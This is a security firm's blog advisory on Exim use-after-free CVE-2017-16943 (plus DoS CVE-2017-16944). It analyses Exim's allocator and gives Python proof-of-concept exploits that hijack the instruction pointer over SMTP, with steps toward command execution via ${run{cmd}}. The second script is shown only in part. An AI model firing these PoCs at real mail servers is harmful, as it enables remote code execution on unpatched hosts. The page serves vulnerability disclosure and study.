
<!DOCTYPE html>
<html lang="zh-TW">
  <head>
    <meta charset="utf-8" />
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA | DEVCORE</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
    <meta name="description" property="og:description" content="On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability." />
    <meta name="keywords" content="Advisory, Exim, RCE, CVE" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20171211/cover.png" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20171211/cover.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
    <link rel="publisher" href="https://plus.google.com/118439315679478709768/" />

  </head>
  <body>
    <div class="page">
      <div class="container--wrapper">
        <div class="topbar">
          <div class="topbar__brand">
            <a href="/en/">
                <div class="logo">
                  DEVCORE
                </div></a>
            <p class="slogan">
              We offer professional <a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services
            </p>
          </div>
          <div class="drawer" id="drawer">
            <div class="drawer__container">
              <nav class="main-menu">
                <div class="hidden">
                  Menu
                </div>
                <a href="/en/services/penetration-test" class="main-menu__link mobile-only">Penetration Testing</a>
                <a href="/en/services/red-team" class="main-menu__link mobile-only">Red Team Assessment</a>
                <a href="/en/services/security-consulting" class="main-menu__link mobile-only">Consulting</a>
                <a href="/en/services/security-training" class="main-menu__link mobile-only">Training</a>
                <a href="/en/about/" class="main-menu__link">Hackers</a><a href="/en/blog/" class="main-menu__link">News</a><a href="/en/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">Search</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
              </nav>
              <a href="/en/contact/" class="drawer__contact button--dense">Contact</a>
              <nav class="lang-menu">
                <div class="lang-menu__label">
                  Lang:
                </div>
                <a href="/" class="lang-menu__link">中文</a>
                <a href="/en/" class="lang-menu__link">English</a>
              </nav>
            </div>
          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
            <div class="bars">
              <div class="bar"></div>
              <div class="bar"></div>
              <div class="bar"></div>
            </div>
          </button>
        </div>
      </div><main role="main">


          <div class="container--wrapper">
            <div class="container">
              <section class="blog-header">
                <small class="blog-header__category"><a href="/en/blog/category/Tech Editorials/">Tech Editorials</a></small>
                <img src="https://devco.re/assets/img/blog/20171211/cover.png" class="blog-header__image" alt="Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA" />
                <h1 class="blog-header__title">
                  Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA
                </h1>
                <div class="blog-header__tags">
                  
                  <a href="/en/blog/tag/Advisory/" class="blog-header__tag">Advisory</a><a href="/en/blog/tag/Exim/" class="blog-header__tag">Exim</a><a href="/en/blog/tag/RCE/" class="blog-header__tag">RCE</a><a href="/en/blog/tag/CVE/" class="blog-header__tag">CVE</a>
                </div>
          
          
                <p class="blog-header__info">
                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/meh.jpg)"></span> <a href="/en/blog/author/meh" class="author-name">Meh</a> <time class="date">on 2017-12-11 </time>
                </p>
          
              </section>
              <article class="article">
          <p>On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.</p>

<h2 id="about-exim">About Exim</h2>
<p>Exim is a message transfer agent (MTA) used on Unix systems. Exim is an open source project and is the default MTA on Debian GNU/Linux systems. According to our survey, there are about 600k SMTP servers running exim on 21st November, 2017 (data collected from scans.io). Also, a <a href="http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html">mail server survey</a> by E-Soft Inc. shows over half of the mail servers identified are running exim.</p>

<h2 id="affected">Affected</h2>
<ul>
  <li>Exim version 4.88 &amp; 4.89 with chunking option enabled.</li>
  <li>According to our survey, about 150k servers affected on 21st November, 2017 (data collected from scans.io).</li>
</ul>

<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>Through our research, the following vulnerabilies were discovered in Exim. Both vulnerabilies involve in BDAT command. BDAT is an extension in SMTP protocol, which is used to transfer large and binary data. A BDAT command is like <code class="highlighter-rouge">BDAT 1024</code> or <code class="highlighter-rouge">BDAT 1024 LAST</code>. With the SIZE and LAST declared, mail servers do not need to scan for the end dot anymore. This command was introduced to exim in version 4.88, and also brought some bugs.</p>
<ul>
  <li>Use-after-free in receive_msg leads to RCE (CVE-2017-16943)</li>
  <li>Incorrect BDAT data handling leads to DoS  (CVE-2017-16944)</li>
</ul>

<h1 id="use-after-free-in-receive_msg-leads-to-rce">Use-after-free in receive_msg leads to RCE</h1>

<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
<p>To explain this bug, we need to start with the memory management of exim. There is a series of functions starts with <code class="highlighter-rouge">store_</code> such as <code class="highlighter-rouge">store_get</code>, <code class="highlighter-rouge">store_release</code>, <code class="highlighter-rouge">store_reset</code>. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:<br />
<img src="/assets/img/blog/20171211/1.png" alt="architecture of storeblock" /></p>

<p>Initially, exim allocates a big storeblock (default 0x2000) and then cut it into <strong>stores</strong> when <code class="highlighter-rouge">store_get</code> is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the <code class="highlighter-rouge">current_block</code> is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes <code class="highlighter-rouge">current_block</code> point to it. Exim maintains three <code class="highlighter-rouge">store_pool</code>, that is, there are three chains like the illustration above and every global variables are actually arrays.<br />
This vulnerability is in <code class="highlighter-rouge">receive_msg</code> where exim reads headers: <br />
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817">receive.c: 1817 receive_msg</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">&gt;=</span> <span class="n">header_size</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="kt">int</span> <span class="n">oldsize</span> <span class="o">=</span> <span class="n">header_size</span><span class="p">;</span>
    <span class="cm">/* header_size += 256; */</span>
    <span class="n">header_size</span> <span class="o">*=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">store_extend</span><span class="p">(</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">oldsize</span><span class="p">,</span> <span class="n">header_size</span><span class="p">))</span>
      <span class="p">{</span>
      <span class="n">uschar</span> <span class="o">*</span><span class="n">newtext</span> <span class="o">=</span> <span class="n">store_get</span><span class="p">(</span><span class="n">header_size</span><span class="p">);</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">newtext</span><span class="p">,</span> <span class="n">next</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
      <span class="n">store_release</span><span class="p">(</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
      <span class="n">next</span><span class="o">-&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="n">newtext</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>It seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to <strong>extend</strong> store, the function <code class="highlighter-rouge">store_extend</code> checks whether the old store is the latest store allocated in <code class="highlighter-rouge">current_block</code>. It returns False immediately if the check is failed.<br />
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276">store.c: 276 store_extend</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">CS</span> <span class="n">ptr</span> <span class="o">+</span> <span class="n">rounded_oldsize</span> <span class="o">!=</span> <span class="n">CS</span> <span class="p">(</span><span class="n">next_yield</span><span class="p">[</span><span class="n">store_pool</span><span class="p">])</span> <span class="o">||</span>
    <span class="n">inc</span> <span class="o">&gt;</span> <span class="n">yield_length</span><span class="p">[</span><span class="n">store_pool</span><span class="p">]</span> <span class="o">+</span> <span class="n">rounded_oldsize</span> <span class="o">-</span> <span class="n">oldsize</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</code></pre></div></div>
<p>Once <code class="highlighter-rouge">store_extend</code> fails, exim tries to get a new store and release the old one. After we look into  <code class="highlighter-rouge">store_get</code> and store_release, we found that <code class="highlighter-rouge">store_get</code> returns a <strong>store</strong>, but <code class="highlighter-rouge">store_release</code> releases a <strong>block</strong> if the store is at the head of it. That is to say, if <code class="highlighter-rouge">next-&gt;text</code> points to the start the <code class="highlighter-rouge">current_block</code> and <code class="highlighter-rouge">store_get</code> cuts store inside it for <code class="highlighter-rouge">newtext</code>, then <code class="highlighter-rouge">store_release(next-&gt;text)</code> frees <code class="highlighter-rouge">next-&gt;text</code>, which is equal to <code class="highlighter-rouge">current_block</code>, and leaves <code class="highlighter-rouge">newtext</code> and <code class="highlighter-rouge">current_block</code> pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call <code class="highlighter-rouge">store_get</code> after <code class="highlighter-rouge">next-&gt;text</code> is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes <code class="highlighter-rouge">store_get</code> reachable and finally leads to an RCE.<br />
Exim uses <a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136">function pointers</a> to switch between different input sources, such as <code class="highlighter-rouge">receive_getc</code>, <code class="highlighter-rouge">receive_getbuf</code>. When receiving BDAT data, <code class="highlighter-rouge">receive_getc</code> is set to <code class="highlighter-rouge">bdat_getc</code> in order to check left chunking data size and to handle following command of BDAT. In <code class="highlighter-rouge">receive_msg</code>, exim also uses <code class="highlighter-rouge">receive_getc</code>. It loops to read data, and stores data into <code class="highlighter-rouge">next-&gt;text</code>, extends if insufficient.<br />
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789">receive.c: 1817 receive_msg</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(;;)</span>
  <span class="p">{</span>
  <span class="kt">int</span> <span class="n">ch</span> <span class="o">=</span> <span class="p">(</span><span class="n">receive_getc</span><span class="p">)(</span><span class="n">GETC_BUFFER_UNLIMITED</span><span class="p">);</span>
  
  <span class="cm">/* If we hit EOF on a SMTP connection, it's an error, since incoming
  SMTP must have a correct "." terminator. */</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span> <span class="o">&amp;&amp;</span> <span class="n">smtp_input</span> <span class="cm">/* &amp;&amp; !smtp_batched_input */</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="n">smtp_reply</span> <span class="o">=</span> <span class="n">handle_lost_connection</span><span class="p">(</span><span class="n">US</span><span class="s">" (header)"</span><span class="p">);</span>
    <span class="n">smtp_yield</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">TIDYUP</span><span class="p">;</span>                       <span class="cm">/* Skip to end of function */</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>In <code class="highlighter-rouge">bdat_getc</code>, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. <br />
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628">smtp_in.c: 628 bdat_getc</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">case</span> <span class="n">BDAT_CMD</span><span class="p">:</span>
      <span class="p">{</span>
      <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">sscanf</span><span class="p">(</span><span class="n">CS</span> <span class="n">smtp_cmd_data</span><span class="p">,</span> <span class="s">"%u %n"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunking_datasize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span>
  <span class="p">{</span>
  <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">synprot_error</span><span class="p">(</span><span class="n">L_smtp_protocol_error</span><span class="p">,</span> <span class="mi">501</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">US</span><span class="s">"missing size for BDAT command"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">ERR</span><span class="p">;</span>
  <span class="p">}</span>
</code></pre></div></div>
<p>In exim, it usually calls <code class="highlighter-rouge">synprot_error</code> to raise error message, which also logs at the same time.<br />
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984">smtp_in.c: 628 bdat_getc</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span>
<span class="nf">synprot_error</span><span class="p">(</span><span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">code</span><span class="p">,</span> <span class="n">uschar</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">uschar</span> <span class="o">*</span><span class="n">errmess</span><span class="p">)</span>
<span class="p">{</span>
<span class="kt">int</span> <span class="n">yield</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="n">log_write</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">LOG_MAIN</span><span class="p">,</span> <span class="s">"SMTP %s error in </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s"> %s %s"</span><span class="p">,</span>
  <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">L_smtp_syntax_error</span><span class="p">)</span><span class="o">?</span> <span class="s">"syntax"</span> <span class="o">:</span> <span class="s">"protocol"</span><span class="p">,</span>
  <span class="n">string_printing</span><span class="p">(</span><span class="n">smtp_cmd_buffer</span><span class="p">),</span> <span class="n">host_and_ident</span><span class="p">(</span><span class="n">TRUE</span><span class="p">),</span> <span class="n">errmess</span><span class="p">);</span>
</code></pre></div></div>
<p>The log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as <code class="highlighter-rouge">'\n'-&gt;'\\n'</code>. Therefore, it asks <code class="highlighter-rouge">store_get</code> for memory to store strings.<br />
This store makes <code class="highlighter-rouge">if (!store_extend(next-&gt;text, oldsize, header_size))</code> in <code class="highlighter-rouge">receive_msg</code> failed when next extension occurs and then triggers use-after-free.</p>

<h3 id="exploitation">Exploitation</h3>
<p>The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to <code class="highlighter-rouge">0xdeadbeef</code>. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when <strong>dkim</strong> is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># CVE-2017-16943 PoC by meh at DEVCORE</span>
<span class="c"># pip install pwntools</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"EHLO test"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"250 HELP"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"MAIL FROM:&lt;meh@some.domain&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RCPT TO:&lt;meh@some.domain&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x1250</span><span class="o">+</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'command'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'BDAT 1'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">':BDAT </span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e00</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="o">+</span> <span class="s">':</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'command'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<ol>
  <li>Running out of <code class="highlighter-rouge">current_block</code><br />
 In order to achieve code execution, we need to make the <code class="highlighter-rouge">next-&gt;text</code> get the first store of a block. That is, running out of <code class="highlighter-rouge">current_block</code> and making <code class="highlighter-rouge">store_get</code> allocate a new block. Therefore, we send a long message <code class="highlighter-rouge">'a'*0x1250+'\x7f'</code> with an unprintable character to cut <code class="highlighter-rouge">current_block</code>, making <code class="highlighter-rouge">yield_length</code> less than 0x100.<br />
 <img src="/assets/img/blog/20171211/2.png" alt="" /></li>
  <li>Starts BDAT data transfer<br />
 After that, we send BDAT command to start data transfer. At the beginning, <code class="highlighter-rouge">next</code> and <code class="highlighter-rouge">next-&gt;text</code> are allocated by <code class="highlighter-rouge">store_get</code>. <br />
 <img src="/assets/img/blog/20171211/3.png" alt="" /><br />
 The function <code class="highlighter-rouge">dkim_exim_verify_init</code> is called sequentially and it also calls <code class="highlighter-rouge">store_get</code>. Notice that this function uses <strong>ANOTHER <code class="highlighter-rouge">store_pool</code></strong>, so it allocates from heap without changing <code class="highlighter-rouge">current_block</code> which <code class="highlighter-rouge">next-&gt;text</code> also points to.<br />
 <a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734">receive.c: 1734 receive_msg</a>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span><span class="n">smtp_input</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">smtp_batched_input</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">dkim_disable_verify</span><span class="p">)</span>
   <span class="n">dkim_exim_verify_init</span><span class="p">(</span><span class="n">chunking_state</span> <span class="o">&lt;=</span> <span class="n">CHUNKING_OFFERED</span><span class="p">);</span>
</code></pre></div>    </div>
  </li>
  <li>Call <code class="highlighter-rouge">store_getc</code> inside <code class="highlighter-rouge">bdat_getc</code><br />
 Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the <code class="highlighter-rouge">current_block</code> with <code class="highlighter-rouge">store_get</code> in <code class="highlighter-rouge">string_printing</code>. <br />
 <img src="/assets/img/blog/20171211/4.png" alt="" /></li>
  <li>Keep sending msg until extension and bug triggered<br />
 In this way, while we keep sending huge messages, <code class="highlighter-rouge">current_block</code> gets freed after the extension. In the malloc.c of glibc (so called ptmalloc2), system manages a linked list of freed memory chunks, which is called unsorted bin. Freed chunks are put into unsorted bin if it is not the last chunk on the heap. In step 2, <code class="highlighter-rouge">dkim_exim_verify_init</code> allocated chunks after <code class="highlighter-rouge">next-&gt;text</code>. Therefore, this chunk is put into unsorted bin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly <code class="highlighter-rouge">current_block-&gt;next</code>, and therefore <code class="highlighter-rouge">current_block-&gt;next</code> is overwritten to <code class="highlighter-rouge">unsorted bin</code> inside <code class="highlighter-rouge">main_arena</code> of libc (linked list pointer <code class="highlighter-rouge">fd</code> points back to <code class="highlighter-rouge">unsorted bin</code> if no other freed chunk exists). <br />
 <img src="/assets/img/blog/20171211/5.png" alt="" /></li>
  <li>Keep sending msg for the next extension<br />
 When the next extension occurs, <code class="highlighter-rouge">store_get</code> tries to cut from <code class="highlighter-rouge">main_arena</code>, which makes attackers able to overwrite all global variables below main_arena.</li>
  <li>Overwrite global variables in libc</li>
  <li>Finish sending message and trigger <code class="highlighter-rouge">free()</code><br />
 In the PoC, we simply modified <code class="highlighter-rouge">__free_hook</code> and ended the line. Exim calls <code class="highlighter-rouge">store_reset</code> to reset the buffer and calls <code class="highlighter-rouge">__free_hook</code> in <code class="highlighter-rouge">free()</code>. At this stage, we successfully controlled instruction pointer <code class="highlighter-rouge">$rip</code>.<br />
 However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both <code class="highlighter-rouge">__free_hook</code> and <code class="highlighter-rouge">_IO_2_1_stdout_</code>. We forged the vtable of <code class="highlighter-rouge">stdout</code> and set <code class="highlighter-rouge">__free_hook</code> to any call of <code class="highlighter-rouge">fflush(stdout)</code> inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both <code class="highlighter-rouge">$rip</code> and the content of first argument. <br />
 We consulted past CVE exploits and decided to call <code class="highlighter-rouge">expand_string</code>, which executes command with <code class="highlighter-rouge">execv</code> if we set the first argument to <code class="highlighter-rouge">${run{cmd}}</code>, and finally we got our RCE. <br />
 <img src="/assets/img/blog/20171211/6.png" alt="" /></li>
</ol>

<h4 id="exploit-for-default-configured-exim">Exploit for default configured exim</h4>
<p>When dkim is disabled, the PoC above fails because <code class="highlighter-rouge">current_block</code> is the last chunk on heap. This makes the system merge it into a big chunk called <strong>top chunk</strong> rather than unsorted bin.<br />
The illustrations below describe the difference of heap layout:<br />
<img src="/assets/img/blog/20171211/8.png" alt="" /><br />
<img src="/assets/img/blog/20171211/9.png" alt="" /></p>

<p>To avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.</p>

<p>After running out of <code class="highlighter-rouge">current_block</code>:</p>
<ol>
  <li>Use DATA command to send lots of data<br />
 Send huge data, make the chunk big and extend many times. After several extension, it calls <code class="highlighter-rouge">store_get</code> to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsorted bin.</li>
  <li>End DATA transfer and start a new email<br />
 Restart to send an email with BDAT command after the heap chunk is prepared.</li>
  <li>Adjust <code class="highlighter-rouge">yield_length</code> again<br />
 Send invalid command with an unprintable charater again to cut the <code class="highlighter-rouge">current_block</code>.</li>
</ol>

<p>Finally the heap layout is like:<br />
<img src="/assets/img/blog/20171211/10.png" alt="" /></p>

<p>And now we can go back to the step 2 at the beginning and create the same situation. When <code class="highlighter-rouge">next-&gt;text</code> is freed, it goes back to unsorted bin and we are able to overwrite libc global variables again.<br />
The following is the PoC for default configured exim:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># CVE-2017-16943 PoC by meh at DEVCORE</span>
<span class="c"># pip install pwntools</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"EHLO test"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"250 HELP"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"MAIL FROM:&lt;&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RCPT TO:&lt;meh@some.domain&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x1280</span><span class="o">+</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'command'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'DATA'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'itself</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x4000</span><span class="o">+</span><span class="s">':</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'.</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'.</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"MAIL FROM:&lt;&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RCPT TO:&lt;meh@some.domain&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x3480</span><span class="o">+</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'command'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'BDAT 1'</span><span class="p">)</span>
